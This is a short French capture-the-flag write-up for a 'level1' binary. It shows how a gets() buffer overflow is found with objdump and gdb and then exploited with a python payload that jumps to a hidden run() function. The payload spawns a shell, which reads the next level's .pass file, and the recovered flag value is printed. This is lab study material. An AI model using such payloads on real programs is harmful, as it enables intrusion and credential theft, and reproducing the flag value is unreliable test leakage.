On fait un objdump -D level1 et on trouve:

08048444 <run>:
xxx

08048480 <main>:
xxx

La fonction run contient un appel system mais cette fonction n'est pas appelé dans le main et n'est pas utilisé. On va voir si l'on peut tout de meme y acceder grace a son adresse

http://beta.hackndo.com/buffer-overflow/#pratique

La fonction main utilise la fonction gets :lit une ligne depuis stdin et la place dans le tampon pointé par s jusqu'à atteindre un retour-chariot, ou EOF, qu'il remplace par « \0 ».
Il n'y a pas de vérification de débordement de tampon. C'est donc du coup dangereux

http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

On lance level1 et on mets beaucoup de caracteres genre 100!
$> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Il y a un segfault.
Avec gdb on voit que ce segfault se produit ici: 0x63413563
Et sur le site on peut traduire cet offset par un nombre: 76. (ou le faire a la main mais c'est chiant ...)

Cela ressemble au classique buffer overflow que l'on a deja vu sur boot2root.

En utilisant l'adresse de run nous avons:
08048444	=>	044840408	=>	'\x44\x84\x04\x08'
   big		=>	 little		=>		shellcode

$> python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/test

Puis on lance la commande :
$> cat /tmp/test | ./level1
Good... Wait what?
Segmentation fault (core dumped)

oups ... dans ce cas
$> cat /tmp/test - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77